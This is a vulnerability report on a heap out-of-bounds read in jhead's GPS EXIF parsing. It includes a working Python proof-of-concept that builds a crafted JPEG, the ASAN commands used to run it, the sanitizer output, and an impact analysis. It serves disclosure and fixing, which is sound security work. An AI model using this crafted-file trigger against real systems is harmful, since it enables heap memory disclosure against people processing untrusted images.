## Bug0: Heap OOB Read in ProcessGpsInfo from Undersized GPS Component Count

In `ProcessGpsInfo()` in `gpsinfo.c`, the loop at lines 141–154 unconditionally iterates three times without verifying that the GPS IFD entry's `Components` field equals 3, causing the loop to read up to 16 bytes beyond the bounds-checked heap region when a crafted JPEG supplies a `TAG_GPS_LAT` entry with `Components` set to 1 and format `FMT_URATIONAL`, and the out-of-bounds bytes propagate into downstream arithmetic at `exif.c:344` where UBSAN detects a left shift of a negative value.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_PATH = "poc_input.jpg"

# TIFF header: II (little-endian), magic=0x002A, IFD0 at offset 8
tiff_header = struct.pack('<HHI', 0x4949, 0x002A, 8)

# IFD0: one entry – GPS sub-IFD pointer
# tag=0x8825, fmt=4 (ULONG), components=1, value=26 (GPS IFD offset)
GPS_IFD_OFFSET = 26
ifd0 = struct.pack('<H', 1)
ifd0 += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)
ifd0 += struct.pack('<I', 0)

# GPS IFD: three entries in ascending tag order.
# Rational data sits at offset 68 (GPS_IFD_OFFSET + 2 + 3*12 + 4).
RATIONAL_OFFSET = GPS_IFD_OFFSET + 2 + 3 * 12 + 4  # = 68

gps_ifd = struct.pack('<H', 3)
# GPS Version: tag=0x0000, fmt=BYTE(1), count=4, inline value
gps_ifd += struct.pack('<HHI4s', 0x0000, 1, 4, b'\x02\x02\x00\x00')
# GPS LatRef: tag=0x0001, fmt=ASCII(2), count=2, inline 'N\0'
gps_ifd += struct.pack('<HHI4s', 0x0001, 2, 2, b'N\x00\x00\x00')
# GPS Lat: tag=0x0002, fmt=URATIONAL(5), count=1 -- TRIGGER (standard requires 3)
gps_ifd += struct.pack('<HHII', 0x0002, 5, 1, RATIONAL_OFFSET)
gps_ifd += struct.pack('<I', 0)  # next GPS IFD = 0

# Only 8 bytes of rational data (one rational: 30/1 degrees).
# Bounds check validates bytes [68..75] only.
# Loop iterations a=1 reads [76..83] and a=2 reads [84..91] -- both OOB.
rational_data = struct.pack('<II', 30, 1)

tiff_data = tiff_header + ifd0 + gps_ifd + rational_data  # 76 bytes total

# Build APP1 segment: FF E1 + big-endian length + "Exif\0\0" + TIFF data
exif_magic = b'Exif\x00\x00'
app1_payload = exif_magic + tiff_data
app1_length  = len(app1_payload) + 2  # includes the 2 length bytes
app1 = b'\xff\xe1' + struct.pack('>H', app1_length) + app1_payload

# Minimal SOF0: 1x1 grey image so jhead can read image dimensions
sof0_len = 2 + 1 + 2 + 2 + 1 + 3  # = 11
sof0 = (b'\xff\xc0'
        + struct.pack('>H', sof0_len)
        + b'\x08'                     # 8-bit precision
        + struct.pack('>HH', 1, 1)    # height=1, width=1
        + b'\x01'                     # 1 component
        + b'\x01\x11\x00')            # comp id=1, sampling 1x1, quant table 0

jpeg = b'\xff\xd8' + app1 + sof0 + b'\xff\xd9'

with open(OUTPUT_PATH, 'wb') as f:
    f.write(jpeg)

print(f"[+] Written {len(jpeg)} bytes to {OUTPUT_PATH}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** exif.c:344:37: runtime error: left shift of negative value -66

### Impact

An attacker who supplies a crafted JPEG with a GPS IFD `TAG_GPS_LAT` or `TAG_GPS_LONG` entry whose `Components` field is less than 3 can cause `ProcessGpsInfo` to read up to 16 bytes of heap memory beyond the validated EXIF section boundary, and those uninitialised bytes flow into arithmetic operations in the EXIF decoding path where a signed left shift on an out-of-bounds negative value triggers undefined behavior. Any jhead invocation on an untrusted JPEG file is exposed because the GPS IFD is parsed automatically during EXIF processing with no user interaction beyond opening the file. In configurations without jhead's 20-byte malloc overallocation (such as custom allocators or tighter ASAN redzones), the out-of-bounds read can be detected as a heap-buffer-overflow and may additionally enable an attacker to read adjacent heap contents, facilitating information disclosure or ASLR bypass.
